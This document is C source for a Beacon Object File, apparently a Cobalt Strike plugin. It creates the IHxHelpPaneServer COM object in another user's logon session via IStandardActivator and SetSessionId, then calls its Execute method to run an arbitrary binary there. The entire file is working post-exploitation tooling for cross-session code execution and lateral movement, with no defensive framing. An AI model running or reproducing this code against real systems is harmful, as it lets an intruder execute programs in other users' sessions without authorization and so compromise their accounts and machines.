#include <windows.h>
#include "bofdefs.h"

LPWSTR EnsureFileProtocol(LPWSTR path) {
    const WCHAR* prefix = L"file:///";
    size_t prefixLen = wcslen(prefix);
    size_t pathLen = wcslen(path);

    // Check if already has file:/// prefix
    if (pathLen >= prefixLen && wcsncmp(path, prefix, prefixLen) == 0) {
        LPWSTR result = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (pathLen + 1) * sizeof(WCHAR));
        if (result) wcscpy(result, path);
        return result;
    }

    // Add prefix
    size_t newLen = prefixLen + pathLen + 1;
    LPWSTR result = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newLen * sizeof(WCHAR));
    if (result == NULL) return NULL;

    wcscpy(result, prefix);
    wcscat(result, path);

    return result;
}

void go(char* args, int len) {
    datap   parser;
    DWORD   sessionId = 0;
    LPWSTR  wExecutablePath = NULL;
    LPWSTR  wFullUrl = NULL;
    HRESULT hr = S_OK;
    BOOL    comInitialized = FALSE;

    IStandardActivator*       pStdActivator = NULL;
    ISpecialSystemProperties* pSpecialProps = NULL;
    IHxHelpPaneServer*        pHxServer = NULL;

    BeaconDataParse(&parser, args, len);
    sessionId = BeaconDataInt(&parser);
    wExecutablePath = BeaconDataExtract(&parser, NULL);

    wFullUrl = EnsureFileProtocol(wExecutablePath);
    if (wFullUrl == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create URL");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Cross-Session Execution");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target Session: %d", sessionId);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Executable: %S", wFullUrl);

    /* Initialize COM */
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoInitializeEx failed: 0x%08X", hr);
        goto cleanup;
    }
    comInitialized = TRUE;

    /* Create IStandardActivator */
    hr = CoCreateInstance(
        &CLSID_ComActivator,
        NULL,
        CLSCTX_INPROC_SERVER,
        &IID_IStandardActivator,
        (void**)&pStdActivator
    );
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get IStandardActivator: 0x%08X", hr);
        goto cleanup;
    }

    /* Get ISpecialSystemProperties */
    hr = pStdActivator->lpVtbl->QueryInterface(
        pStdActivator,
        &IID_ISpecialSystemProperties,
        (void**)&pSpecialProps
    );
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get ISpecialSystemProperties: 0x%08X", hr);
        goto cleanup;
    }

    /* Set target session ID */
    hr = pSpecialProps->lpVtbl->SetSessionId(pSpecialProps, sessionId, FALSE, TRUE);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set session ID: 0x%08X", hr);
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Session ID set to %d", sessionId);

    /* Create IHxHelpPaneServer in target session */
    MULTI_QI mqi[1];
    memset(mqi, 0, sizeof(mqi));
    mqi[0].pIID = &IID_IHxHelpPaneServer;
    mqi[0].pItf = NULL;
    mqi[0].hr = S_OK;

    hr = pStdActivator->lpVtbl->StandardCreateInstance(
        pStdActivator,
        &CLSID_IHxHelpPaneServer,
        NULL,
        CLSCTX_ALL,
        NULL,
        1,
        mqi
    );
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] StandardCreateInstance failed: 0x%08X", hr);
        goto cleanup;
    }
    if (FAILED(mqi[0].hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] MULTI_QI failed: 0x%08X", mqi[0].hr);
        goto cleanup;
    }

    pHxServer = (IHxHelpPaneServer*)mqi[0].pItf;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] IHxHelpPaneServer spawned in session %d", sessionId);

    /* Execute the binary */
    hr = pHxServer->lpVtbl->Execute(pHxServer, wFullUrl);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Execute failed: 0x%08X", hr);
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS! Binary executed in session %d", sessionId);

cleanup:
    if (pHxServer)     pHxServer->lpVtbl->Release(pHxServer);
    if (pSpecialProps) pSpecialProps->lpVtbl->Release(pSpecialProps);
    if (pStdActivator) pStdActivator->lpVtbl->Release(pStdActivator);
    if (comInitialized) CoUninitialize();
    if (wFullUrl)       HeapFree(GetProcessHeap(), 0, wFullUrl);
}

